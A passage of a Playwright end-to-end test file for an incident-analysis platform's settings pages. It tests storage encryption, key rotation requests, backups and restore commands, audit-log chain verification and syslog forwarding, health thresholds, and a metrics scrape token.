  await expect(page.getByText(/1 message is in /)).toBeVisible()

  await openIncidentFromList()
})

test('Storage shows how full the disk is and what fills it', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Storage').click()
  await expect(settings.getByRole('img', { name: /% of the disk is used/ })).toBeVisible()
  const use = settings.getByRole('table', { name: 'Disk use' })
  await expect(use).toContainText('Mailboxes')
  await expect(use).toContainText('Database')
  await expect(use).toContainText('Everything else on the disk')
  await expect(settings.getByRole('list', { name: 'Largest objects' })).toContainText('team.mbox')
  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('the store is encrypted: Storage says so, the disk holds no file in clear, a download is what was uploaded', async () => {
  // A capture goes in through the API, as an upload does.
  const fixture = readFileSync(new URL('./fixtures/phish.pcapng', import.meta.url))
  const incidentId = lastIncident.split('/').pop()
  const uploaded = await page.request.post(`/api/incidents/${incidentId}/captures`, {
    multipart: { file: { name: 'sealed.pcapng', mimeType: 'application/octet-stream', buffer: fixture } },
  })
  expect(uploaded.status()).toBe(201)
  const captureId = (await uploaded.json()).capture.id

  // On the disk of the server it is sealed: nothing of the capture can be read there.
  const stored = readFileSync(`../backend/.e2e-samples/_captures/${captureId}/capture.pcapng`)
  expect(stored.subarray(0, 8).toString('latin1')).toBe('NIKSEAL1')
  expect(stored.length).toBeGreaterThan(fixture.length)
  expect(fixture.includes('login-paypa1.example')).toBe(true)
  expect(stored.includes('login-paypa1.example')).toBe(false)
  expect(stored.includes(fixture.subarray(0, 64))).toBe(false)

  // What comes back is the capture, byte for byte; a range of it is served without the rest.
  const whole = await page.request.get(`/api/captures/${captureId}/file`)
  expect(whole.status()).toBe(200)
  expect((await whole.body()).equals(fixture)).toBe(true)
  const part = await page.request.get(`/api/captures/${captureId}/file`, { headers: { Range: 'bytes=100-199' } })
  expect(part.status()).toBe(206)
  expect((await part.body()).equals(fixture.subarray(100, 200))).toBe(true)
  expect((await page.request.delete(`/api/incidents/${incidentId}/captures/${captureId}`)).status()).toBe(204)

  // The screen says the whole store is encrypted, and since when (a new server: from its first start).
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Storage').click()
  const encryption = settings.getByRole('region', { name: 'Encryption of the store' })
  await expect(encryption).toContainText('Every file of the store is encrypted since', { timeout: 30_000 })
  await expect(encryption).toContainText('Encrypted')
  await expect(encryption).toContainText(/store key [0-9a-f]{4}-[0-9a-f]{4}/)
  await expect(encryption.getByRole('button', { name: 'Check again' })).toBeVisible()
  await expect(encryption.getByRole('button', { name: 'Pause' })).toHaveCount(0)
  await expect(encryption.getByRole('list', { name: 'Damaged files' })).toHaveCount(0)
  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('Keys lists the keys of the server without a value, and a change of key is asked for from the screen', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Keys', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/system\/keys$/)

  const encrypting = settings.getByRole('list', { name: 'Keys that encrypt and sign' })
  await expect(encrypting.getByRole('listitem')).toHaveCount(4)
  // The key that signs the audit log: the test server was given none, so the one derived from the secret key
  // signs; every entry written so far was signed with it, and none has lost its key.
  const auditKey = encrypting.getByRole('listitem', { name: 'Audit key' })
  await expect(auditKey).toContainText('from the secret key, derived')
  await expect(auditKey).toContainText(/fingerprint derived-[0-9a-f]{12}/)
  await expect(auditKey).toContainText('Held by: api, automation')
  await expect(auditKey.getByRole('group', { name: 'What each key signed' })).toContainText(
    /derived-[0-9a-f]{12}: \d+ entries, the key in use/,
  )
  await expect(auditKey).not.toContainText('cannot be checked')
  const secretKey = encrypting.getByRole('listitem', { name: 'Secret key' })
  const storeKey = encrypting.getByRole('listitem', { name: 'Store key' })
  // A key is spoken of by its fingerprint; the test server has no key given to it, and the page says so.
  await expect(secretKey).toContainText(/fingerprint [0-9a-f]{4}-[0-9a-f]{4}/)
  await expect(storeKey).toContainText(/fingerprint [0-9a-f]{4}-[0-9a-f]{4}/)
  await expect(storeKey).toContainText('Held by: api')
  await expect(secretKey).toContainText('Held by: api, automation')
  await expect(storeKey).toContainText('from not set')
  await expect(encrypting.getByRole('listitem', { name: 'Backup passphrase' })).toContainText(/set|not set/)
  // The keys the server runs with in development are known to everybody: none of them is on the page.
  await expect(settings).not.toContainText('dev-insecure')
  const others = settings.getByRole('list', { name: 'Passwords and tokens' })
  await expect(others.getByRole('listitem')).toHaveCount(8)
  await expect(others.getByRole('listitem', { name: 'Database password' })).toContainText('ALTER ROLE nik PASSWORD')
  await expect(settings.getByText('The store of files', { exact: true })).toBeVisible()

  // The audit key is changed from the same place; its dialog says that nothing is signed again.
  await auditKey.getByRole('button', { name: 'Rotate…' }).click()
  const auditDialog = page.getByRole('dialog', { name: 'Change the audit key' })
  await expect(auditDialog).toContainText('signs the audit log from the next entry on')
  await expect(auditDialog.getByRole('list', { name: 'What keeps its key' })).toContainText(
    /\d+ × entry of the audit log that keeps the key that signed it/,
  )
  await expect(auditDialog).toContainText('The containers api and automation restart once')
  await auditDialog.getByRole('button', { name: 'Cancel' }).click()
  await expect(auditDialog).toBeHidden()

  // Asking for the store key to be changed: what it touches, who asks, then the command for the server.
  await storeKey.getByRole('button', { name: 'Rotate…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Change the store key' })
  await expect(dialog.getByRole('list', { name: 'What will be put under the new key' })).toContainText(
    /file of the store|Nothing is stored under this key yet/,
  )
  await expect(dialog).toContainText('never shown')
  const ask = dialog.getByRole('button', { name: 'Ask for the change' })
  await expect(ask).toBeDisabled()
  await dialog.getByLabel('Your password').fill('not the password')
  await ask.click()
  await expect(dialog.getByRole('alert')).toContainText('The current password is not correct')
  await dialog.getByLabel('Your password').fill(ADMIN.password)
  await ask.click()
  await expect(dialog.getByRole('status')).toContainText('The change was asked for')
  await expect(dialog).toContainText('deploy/secrets.sh rotate store-key')
  await expect(dialog).toContainText('The container api restarts twice')
  await dialog.getByRole('button', { name: 'Done' }).click()
  await expect(dialog).toBeHidden()
  await expect(storeKey).toContainText('change asked for')
  await expect(secretKey).not.toContainText('change asked for')

  // The request is in the audit log, and can be withdrawn.
  const audit = await (await page.request.get('/api/audit?q=STORE_KEY')).json()
  expect(audit.entries.some((entry) => entry.action === 'key.rotate.request' && entry.target === 'STORE_KEY')).toBe(
    true,
  )
  await storeKey.getByRole('button', { name: 'How to change it…' }).click()
  await expect(dialog).toContainText('deploy/secrets.sh rotate store-key')
  await dialog.getByRole('button', { name: 'Withdraw the request' }).click()
  await expect(dialog).toBeHidden()
  await expect(storeKey).not.toContainText('change asked for')
  await expect(storeKey.getByRole('button', { name: 'Rotate…' })).toBeVisible()

  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('Workers lists every worker of the server and says which are not configured', async () => {
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Workers').click()
  await expect(page).toHaveURL(/\/settings\/system\/workers$/)
  const workers = settings.getByRole('list', { name: 'Workers' })
  await expect(workers.getByRole('listitem')).toHaveCount(7)
  // The test server runs the playbooks itself: there is no automation worker of its own to watch.
  await expect(workers.getByRole('listitem').filter({ hasText: 'Automation worker' })).toContainText('not configured')
  const sandbox = workers.getByRole('listitem').filter({ hasText: 'Script sandbox' })
  await expect(sandbox).toContainText(/answering|not checked yet|not configured/)
  await settings.getByRole('button', { name: 'Refresh' }).click()
  await expect(workers.getByRole('listitem')).toHaveCount(7)
  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('Settings is a page: every section has an address, Back leaves it, a link opens it', async () => {
  const before = new URL(page.url()).pathname
  const gear = page.getByRole('button', { name: 'Platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
  // The sections are in groups; the one shown is marked.
  await expect(sections.getByRole('group')).toHaveCount(8)
  await expect(sections.getByRole('group', { name: 'Rule sets' }).getByRole('button')).toHaveText([
    'YARA rules',
    'capa rules',
    'FLIRT signatures',
    'Script signatures',
  ])
  await expect(sections.getByRole('button', { name: 'Detection rules' })).toHaveAttribute('aria-current', 'page')
  // The rail shows the page is open; what was open under it is not shown.
  await expect(page.getByRole('button', { name: 'Platform settings' })).toHaveAttribute('aria-pressed', 'true')
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()

  // The box narrows the sections by name and by keyword.
  const find = settings.getByRole('searchbox', { name: 'Find a setting' })
  await find.fill('password')
  await expect(sections.getByRole('button')).toHaveText(['My account'])
  await find.fill('restore')
  await expect(sections.getByRole('button')).toHaveText(['Backup'])
  await find.fill('zzz')
  await expect(sections.getByRole('status')).toContainText('No section matches')
  await find.fill('')

  // A section has its address; the full backup is one of them.
  await sections.getByRole('button', { name: 'Backup' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/backup$/)
  await expect(settings.getByRole('button', { name: 'Export incidents and accounts' })).toBeVisible()
  await sections.getByRole('button', { name: 'Audit log' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/audit-log$/)

  // Back leaves the page in one step, wherever one went inside it; Forward returns to the section.
  await page.goBack()
  await expect(settings).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  await page.goForward()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()

  // The address is a link: a reload stays on the section.
  await page.reload()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()
  await expect(sections.getByRole('button', { name: 'Audit log' })).toHaveAttribute('aria-current', 'page')
  // An older or shortened address still opens the page.
  await page.goto('/settings/accounts')
  await expect(settings.getByRole('heading', { name: 'Accounts', level: 2 })).toBeVisible()

  // Closing a page opened by its link goes to the start; an entry of the rail leaves it too.
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await gear.click()
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('Settings → Backup: the passphrase, the settings and the unsaved question, a backup taken and tested, its restore command', async () => {
  test.setTimeout(180_000)
  const before = new URL(page.url()).pathname
  await page.goto('/settings/system/backup')
  const settings = page.getByRole('region', { name: 'Settings' })
  await expect(settings.getByRole('heading', { name: 'Backup', level: 2 })).toBeVisible()

  // Nothing yet: the skull says how a backup gets here, and none is taken before a passphrase is set.
  await expect(settings.getByText('No backup yet')).toBeVisible()
  await expect(settings.getByText('Set the backup passphrase: the server then takes its backups')).toBeVisible()
  const now = settings.getByRole('button', { name: 'Back up now' })
  await expect(now).toBeDisabled()
  const state = settings.getByLabel('State of the backups')
  await expect(state).toContainText('None yet')
  await expect(state).toContainText('Not before a passphrase is set')
  // What was "Full backup" is still here, said to be an export.
  await expect(settings.getByRole('heading', { name: 'Export as one file' })).toBeVisible()
  await expect(settings.getByRole('button', { name: 'Export incidents and accounts' })).toBeVisible()
  await expect(settings.getByRole('button', { name: 'Import a file…' })).toBeVisible()
  await expect(settings.getByText('Importing a file adds what is not here and changes nothing that is.')).toBeVisible()

  // The passphrase: typed twice, with the warning that nobody can recover it.
  await settings.getByRole('button', { name: 'Set the passphrase…' }).click()
  const phrase = page.getByRole('dialog', { name: 'Set the backup passphrase' })
  await expect(phrase).toContainText('Write it down')
  await phrase.getByLabel('Passphrase', { exact: true }).fill('a passphrase for the e2e run')
  const set = phrase.getByRole('button', { name: 'Set the passphrase' })
  await expect(set).toBeDisabled()
  await phrase.getByLabel('The same passphrase again').fill('a passphrase for the e2e run')
  await set.click()
  await expect(phrase).toHaveCount(0)
  await expect(settings.getByText('A backup passphrase is set.')).toBeVisible()
  await expect(settings.getByRole('button', { name: 'Change the passphrase…' })).toBeVisible()
  await expect(now).toBeEnabled()
  // What a server starts with: a backup every six hours, the latest eight kept.
  await expect(state).toContainText('Every 6 hours, counted from 02:30 (UTC).')

  // The settings: what is typed and not saved is asked about before leaving.
  const form = settings.getByRole('form', { name: 'Backup settings' })
  const save = form.getByRole('button', { name: 'Save the settings' })
  await expect(save).toBeDisabled()
  const kept = form.getByLabel('The latest good backups')
  await expect(kept).toHaveValue('8')
  await expect(form.getByLabel('Room the backups take')).toContainText('No backup is kept yet.')
  await kept.fill('5')
  await expect(save).toBeEnabled()
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
  const ask = page.getByRole('dialog', { name: 'Leave without saving?' })
  await expect(ask).toContainText('The settings of the backups')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(ask).toHaveCount(0)
  await expect(kept).toHaveValue('5')
  // What cannot be saved is said, and is not saved.
  await kept.fill('0')
  await expect(save).toBeDisabled()
  await expect(form).toContainText('The number of backups kept is from 1 to 365.')
  await kept.fill('5')
  await form.getByLabel('How often').selectOption('day')
  await save.click()
  await expect(save).toBeDisabled()
  await expect(state).toContainText('Every day at 02:30 (UTC).')
  await page.reload()
  await expect(form.getByLabel('The latest good backups')).toHaveValue('5')
  await expect(form.getByLabel('How often')).toHaveValue('day')

  // Back up now: the page waits with the server, and the backup arrives tested.
  await now.click()
  await expect(settings.getByRole('status').filter({ hasText: 'A backup was asked for' })).toBeVisible()
  const list = settings.getByRole('table', { name: 'Backups' })
  const row = list.getByRole('row').filter({ hasText: /nik-\d{8}-\d{6}/ })
  await expect(row).toHaveCount(1)
  await expect(settings.getByText('The server is working on a backup…')).toBeVisible()
  await expect(now).toBeDisabled()
  await expect(row).toContainText('verified', { timeout: 90_000 })
  await expect(row).toContainText('Database and files · the last good one')
  await expect(row).toContainText('this server')
  await expect(now).toBeEnabled()
  await expect(state).not.toContainText('None yet')
  // The room it takes, and what the settings lead to at that size.
  await expect(form.getByLabel('Room the backups take')).toContainText('1 backup is kept now')
  await expect(form.getByLabel('Room the backups take')).toContainText('With these settings up to 9 are kept')
  const name = (await row.getByRole('rowheader').textContent()).match(/nik-\d{8}-\d{6}/)[0]

  // How to put it back: the command, on the server.
  await row.getByRole('button', { name: `How to restore ${name}` }).click()
  const how = page.getByRole('dialog', { name: `How to restore ${name}` })
  await expect(how.getByLabel('Restore command')).toHaveText(`deploy/restore.sh ${name}`)
  await expect(how).toContainText('It asks for the passphrase this backup was made with')
  await how.getByRole('button', { name: 'Close', exact: true }).last().click()
  await expect(how).toHaveCount(0)
  // The row has the menu of an object: its actions, what to copy, and the deletion apart.
  await row.getByRole('rowheader').click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu.getByRole('menuitem', { name: 'Verify now' })).toBeVisible()
  await expect(menu.getByRole('menuitem', { name: 'Copy the restore command' })).toBeVisible()
  await menu.getByRole('menuitem', { name: 'Delete…' }).click()

  // Deleting asks for the name, and once more for the last good one.
  const gone = page.getByRole('dialog', { name: `Delete ${name}` })
  const remove = gone.getByRole('button', { name: 'Delete the backup' })
  await expect(remove).toBeDisabled()
  await gone.getByLabel('Type its name to delete it').fill(name)
  await expect(remove).toBeDisabled()
  await gone.getByRole('checkbox').check()
  await remove.click()
  await expect(gone).toHaveCount(0)
  await expect(settings.getByText('No backup yet')).toBeVisible()
  await expect(settings.getByText('The server takes one at the next run of the schedule.')).toBeVisible()

  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('Settings → Backup: a server without an archive of its log says it cannot be brought back to a moment', async () => {
  const before = new URL(page.url()).pathname
  await page.goto('/settings/system/backup')
  const settings = page.getByRole('region', { name: 'Settings' })
  await expect(settings.getByRole('heading', { name: 'Backup', level: 2 })).toBeVisible()

  // Under the backups and the export: the recovery to a moment, which this server does not have.
  const recovery = settings.getByRole('region', { name: 'Recovery to a moment' })
  await expect(recovery.getByRole('heading', { name: 'Recovery to a moment' })).toBeVisible()
  await expect(recovery).toContainText(
    'This server keeps no archive of its database log, so it cannot be brought back to a moment. ' +
      'The archive is part of the Compose stack.',
  )
  // Nothing else of it is shown: no command, no base backup to ask for, no settings.
  await expect(recovery.getByRole('button')).toHaveCount(0)
  await expect(settings.getByRole('form', { name: 'Recovery settings' })).toHaveCount(0)
  await expect(settings.getByRole('table', { name: 'Base backups' })).toHaveCount(0)

  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('Settings → Audit log: the chain is verified on demand, and the log is forwarded to a syslog receiver', async () => {
  test.setTimeout(180_000)
  const before = new URL(page.url()).pathname
  // A syslog receiver of the test's own, over TCP: it keeps every message, read by its length.
  const got = []
  const receiver = createServer((socket) => {
    let pending = Buffer.alloc(0)
    socket.on('data', (data) => {
      pending = Buffer.concat([pending, data])
      for (;;) {
        const space = pending.indexOf(0x20)
        if (space < 0) break
        const size = Number(pending.subarray(0, space).toString('ascii'))
        if (!Number.isInteger(size) || pending.length < space + 1 + size) break
        got.push(pending.subarray(space + 1, space + 1 + size).toString('utf8'))
        pending = pending.subarray(space + 1 + size)
      }
    })
    socket.on('error', () => {})
  })
  await new Promise((resolve) => receiver.listen(0, '127.0.0.1', resolve))
  const port = receiver.address().port
  const bodies = (kind) =>
    got.map((line) => JSON.parse(line.slice(line.indexOf('{"nik":')))).filter((body) => body.nik === kind)

  try {
    await page.goto('/settings/system/audit-log')
    const settings = page.getByRole('region', { name: 'Settings' })
    await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()

    // ---- The chain: its state, and Verify now ----
    const chain = settings.getByRole('region', { name: 'Chain of the audit log' })
    const chainState = chain.getByRole('status', { name: 'State of the chain' })
    await expect(chainState).toBeVisible()
    await chain.getByRole('button', { name: 'Verify now' }).click()
    await expect(chain.getByText(/^The chain holds up to entry \d+\.$/)).toBeVisible()
    await expect(chain).toContainText(/Holds up to entry \d+/)
    await expect(chainState).toContainText('Verified ')
    // Verifying is itself in the log, linked like every entry.
    const said = (await (await page.request.get('/api/audit?q=action:audit.verify')).json()).entries[0]
    expect(said.details).toMatch(/^Verified the audit log: it holds up to entry \d+$/)
    expect(said.seq).toBeGreaterThan(1)
    expect(said.hash).toMatch(/^[0-9a-f]{64}$/)
    // Held against a head from outside that is past its end: the newest entries were removed, it says.
    await chain.getByText('Hold it against a head from outside').click()
    const outside = chain.getByLabel('Head from outside')
    await outside.fill('nonsense')
    await expect(chain).toContainText('A head is the number of an entry, a colon, and its hash')
    await outside.fill(`999999:${'a'.repeat(64)}`)
    await chain.getByRole('button', { name: 'Verify now' }).click()
    await expect(chain).toContainText('Broken at entry')
    await expect(chainState).toContainText('The head given knows the log up to entry 999999')
    await expect(chain.getByRole('alert')).toContainText('verifier.py')
    // Without it the log holds: nothing on the server says otherwise.
    await outside.fill('')
    await chain.getByRole('button', { name: 'Verify now' }).click()
    await expect(chain.getByText(/^The chain holds up to entry \d+\.$/)).toBeVisible()

    // ---- The forwarding: off, set, the unsaved question, Test, on ----
    const forwarding = settings.getByRole('region', { name: 'Forwarding to syslog' })
    const state = forwarding.getByRole('status', { name: 'State of the forwarding' })
    await expect(forwarding).toContainText('Not forwarded')
    await expect(state).toContainText('The log exists on this server only.')
    const form = forwarding.getByRole('form', { name: 'Forwarding settings' })
    const save = form.getByRole('button', { name: 'Save the forwarding' })
    const tryIt = form.getByRole('button', { name: 'Test', exact: true })
    await expect(save).toBeDisabled()
    await expect(tryIt).toBeDisabled()
    await form.getByLabel('Receiver', { exact: true }).fill('127.0.0.1')
    await form.getByLabel('Protocol').selectOption('udp')
    await expect(form).toContainText('Lossy and unauthenticated')
    await expect(form.getByLabel('Largest datagram (bytes)')).toBeVisible()
    await form.getByLabel('Protocol').selectOption('tcp')
    await expect(form).toContainText('Nothing is encrypted and the receiver is not authenticated')
    await expect(form.getByLabel('Port', { exact: true })).toHaveValue('514')
    await form.getByLabel('Port', { exact: true }).fill('0')
    await expect(save).toBeDisabled()
    await expect(form).toContainText('The port is a number from 1 to 65535.')
    await form.getByLabel('Port', { exact: true }).fill(String(port))
    await form.getByLabel('A new receiver gets').selectOption('now')
    await expect(save).toBeEnabled()
    // What is typed and not saved is asked about before leaving.
    await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
    const ask = page.getByRole('dialog', { name: 'Leave without saving?' })
    await expect(ask).toContainText('The forwarding of the audit log')
    await ask.getByRole('button', { name: 'Stay', exact: true }).click()
    await expect(ask).toHaveCount(0)
    await expect(form.getByLabel('Receiver', { exact: true })).toHaveValue('127.0.0.1')
    await save.click()
    await expect(save).toBeDisabled()

    // Test: a marked message over a connection of its own, and what the socket said.
    await tryIt.click()
    const result = form.getByRole('status', { name: 'Result of the test' })
    await expect(result).toContainText(`Connected to 127.0.0.1:${port}`, { timeout: 60_000 })
    await expect(result).toContainText('the receiver kept the connection open')
    await expect.poll(() => bodies('test').length).toBe(1)
    expect(got[0]).toMatch(/^<109>1 \S+Z nik nik - test \[nik@32473 test="[0-9a-f]{12}"\] \{"nik":"test"/)
    await expect(result).toContainText(`The message is marked ${bodies('test')[0].test}.`)
    expect(bodies('audit')).toHaveLength(0)

    // Turned on: the entries arrive in order, each with its place in the chain, and the state says where they go.
    await form.getByRole('switch', { name: 'Send the audit log to a syslog receiver' }).click()
    await save.click()
    await expect(forwarding).toContainText(`Sent to tcp://127.0.0.1:${port}`, { timeout: 60_000 })
    await expect.poll(() => bodies('audit').length, { timeout: 30_000 }).toBeGreaterThan(0)
    await page.request.post('/api/audit', { data: { action: 'incident.export', details: 'Exported for the e2e run' } })
    await expect
      .poll(() => bodies('audit').some((body) => body.details === 'Exported for the e2e run'), { timeout: 30_000 })
      .toBe(true)
    const entries = bodies('audit')
    // "From this change on": the first entry it got is the one that named it as the receiver, and
    // the one that turned the forwarding on follows.
    expect(entries[0].action).toBe('audit.forward.settings')
    expect(entries[0].details).toContain('Changed the forwarding of the audit log: the receiver, the port')
    expect(
      entries.some((entry) =>
        entry.details.startsWith(`Turned on the forwarding of the audit log to tcp://127.0.0.1:${port}`),
      ),
    ).toBe(true)
    for (let index = 1; index < entries.length; index += 1) {
      expect(entries[index].seq).toBe(entries[index - 1].seq + 1)
      expect(entries[index].prev).toBe(entries[index - 1].hash)
    }
    expect(bodies('checkpoint').length).toBeGreaterThan(0)
    await expect(state).toContainText('Nothing waits.', { timeout: 30_000 })

    // Turned off: the last thing the receiver hears is that.
    await form.getByRole('switch', { name: 'Send the audit log to a syslog receiver' }).click()
    await save.click()
    await expect(forwarding).toContainText('Not forwarded', { timeout: 60_000 })
    await expect
      .poll(() => bodies('audit').at(-1)?.details ?? '', { timeout: 30_000 })
      .toContain('Turned off the forwarding of the audit log')

    await settings.getByRole('button', { name: 'Close settings' }).click()
    await expect(settings).toHaveCount(0)
  } finally {
    receiver.close()
    await page.request.put('/api/audit/forwarding', { data: { enabled: false } })
  }
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('Settings → Health: every row with its state, one made to need attention, the thresholds, the scrape token', async () => {
  test.setTimeout(120_000)
  const before = new URL(page.url()).pathname
  await page.goto('/settings/system/health')
  const settings = page.getByRole('region', { name: 'Settings' })
  await expect(settings.getByRole('heading', { name: 'Health', level: 2 })).toBeVisible()
  const summary = settings.getByRole('status', { name: 'Summary' })
  await expect(summary).toBeVisible()
  // The groups of the page, each a list of rows with a value and a state.
  for (const group of ['Disk', 'Database', 'Queues', 'Work in progress', 'Backups', 'Audit log', 'Sign-in', 'Server']) {
    await expect(settings.getByRole('list', { name: group, exact: true })).toBeVisible()
  }
  // What restarts left behind: nothing waits for a person, nothing was set aside, nothing is held by nobody.
  const work = settings.getByRole('list', { name: 'Work in progress', exact: true })
  await expect(work.getByRole('listitem')).toHaveCount(3)
  await expect(
    work.getByRole('listitem').filter({ hasText: 'Steps a restart interrupted that wait for a person' }),
  ).toContainText('None')
  await expect(work.getByRole('listitem').filter({ hasText: 'Oldest work held without a sign of life' })).toContainText(
    'all alive',
  )
  const disk = settings.getByRole('list', { name: 'Disk', exact: true })
  const store = disk.getByRole('listitem').filter({ hasText: 'Store of files' })
  await expect(store).toContainText(/\d+% used, .+ free of .+/)
  await expect(settings.getByRole('list', { name: 'Audit log', exact: true })).toContainText('Holds up to entry')
  await expect(settings.getByRole('list', { name: 'Server', exact: true })).toContainText(/Nik \d+\.\d+\.\d+/)
  // A row leads to the page that has the whole story.
  await store.getByRole('button', { name: 'Open the page of Store of files' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/storage$/)
  await page.goBack()
  await expect(page).toHaveURL(/\/settings\/system\/health$/)

  // ---- The thresholds: a disk made to need attention on purpose ----
  const form = settings.getByRole('form', { name: 'Thresholds' })
  const save = form.getByRole('button', { name: 'Save the thresholds' })
  const attention = form.getByLabel('A disk needs attention when it is this full, in percent')
  await expect(attention).toHaveValue('80')
  await expect(save).toBeDisabled()
  await attention.fill('0')
  await expect(form).toContainText(
    'A disk needs attention when it is this full, in percent: a whole number from 1 to 99.',
  )
  await expect(save).toBeDisabled()
  await attention.fill('1')
  // Not saved yet: asked about before leaving.
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
  const ask = page.getByRole('dialog', { name: 'Leave without saving?' })
  await expect(ask).toContainText('The thresholds of the health page')
  await ask.getByRole('button', { name: 'Stay', exact: true }).click()
  await expect(ask).toHaveCount(0)
  await save.click()
  await expect(save).toBeDisabled()
  const wrong = settings.getByRole('list', { name: 'What needs attention' })
  await expect(wrong.getByRole('listitem').filter({ hasText: 'Store of files' })).toContainText(/attention|problem/)
  await expect(wrong).toContainText('Free some room or give it a larger disk before it is full')
  await expect(summary).toContainText(/need(s)? attention/)
  await page.reload()
  await expect(form.getByLabel('A disk needs attention when it is this full, in percent')).toHaveValue('1')
  await expect(settings.getByRole('list', { name: 'What needs attention' })).toContainText('Store of files')
  // Put back to what a server starts with.
  await form.getByLabel('A disk needs attention when it is this full, in percent').fill('80')
  await save.click()
  await expect(save).toBeDisabled()
  const kept = (await (await page.request.get('/api/health/details')).json()).thresholds
  expect(kept.find((entry) => entry.name === 'diskAttentionPercent').value).toBe(80)

  // ---- The metrics: nobody reads them without the token, which is shown once ----
  const metrics = settings.getByRole('region', { name: 'Metrics for Prometheus' })
  const token = metrics.getByRole('status', { name: 'Scrape token' })
  await expect(token).toContainText('No token is set: the metrics answer to nobody.')
  // The signed-in administrator's own cookie is not a way in.
  expect((await page.request.get('/api/metrics')).status()).toBe(401)
  await metrics.getByRole('button', { name: 'Make a token…' }).click()
  const shown = page.getByRole('dialog', { name: 'Scrape token' })
  await expect(shown).toContainText('This is the only time the token is shown.')
  const secret = (await shown.getByLabel('The token').textContent()).trim()
  expect(secret).toMatch(/^nikm_[A-Za-z0-9_-]{40,}$/)
  await shown.getByRole('button', { name: 'I copied it' }).click()
  await expect(shown).toHaveCount(0)
  await expect(token).toContainText(`A token is set (it ends in ${secret.slice(-4)}), made by admin`)
  await expect(settings).not.toContainText(secret)
  const scraped = await page.request.get('/api/metrics', { headers: { Authorization: `Bearer ${secret}` } })
  expect(scraped.status()).toBe(200)
  const text = await scraped.text()
  expect(text).toContain('# TYPE nik_health_state gauge')
  expect(text).toMatch(/nik_disk_used_bytes\{disk="store"\} \d+/)
  expect(text).toMatch(/nik_audit_entries_total \d+/)
  // No account is named in a label.
  expect(text).not.toMatch(/="admin"/)
  expect((await page.request.get('/api/metrics', { headers: { Authorization: 'Bearer nope' } })).status()).toBe(401)
  // How an operator points Prometheus at it: the address in use, and a file for the token.
  await metrics.getByText('How to point Prometheus at it').click()
  await expect(metrics).toContainText('metrics_path: /api/metrics')
  await expect(metrics).toContainText(`- targets: ["${new URL(page.url()).host}"]`)
  await metrics.getByRole('button', { name: 'Remove the token' }).click()
  await expect(token).toContainText('No token is set')
  expect((await page.request.get('/api/metrics', { headers: { Authorization: `Bearer ${secret}` } })).status()).toBe(
    401,
  )

  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('a server that stopped its upgrade says so in place of the sign-in, and asks nobody to sign in', async ({
  browser,
}) => {
  // What the api container answers while an upgrade is stopped (backend/app/backups/upgrade.py):
  // 503 with one sentence for every request, the sign-in routes and the session's own included.
  const sentence =
    'The upgrade of Nik was stopped before it changed anything: its migrations fail on a copy of the database. ' +
    'The data is as it was. The administrator of the server finds the reason in the log of the api container, ' +
    'and the way back in the deployment guide (An upgrade went wrong).'
  const visitor = await browser.newPage()
  let asked = 0
  await visitor.route('**/api/**', (route) => {
    asked += 1
    return route.fulfill({
      status: 503,
      contentType: 'application/json',
      body: JSON.stringify({ detail: sentence, upgrade: { stopped: true, stage: 'rehearsal', version: '6.7.0' } }),
    })
  })
  await visitor.goto('/')
  await expect(visitor.getByRole('heading', { name: 'Nik is not running', level: 1 })).toBeVisible()
  await expect(visitor.getByText(sentence)).toBeVisible()
  // No sign-in form, no error of a sign-in, no "session ended" question, and the page does not keep asking.
  await expect(visitor.locator('#login-username')).toHaveCount(0)
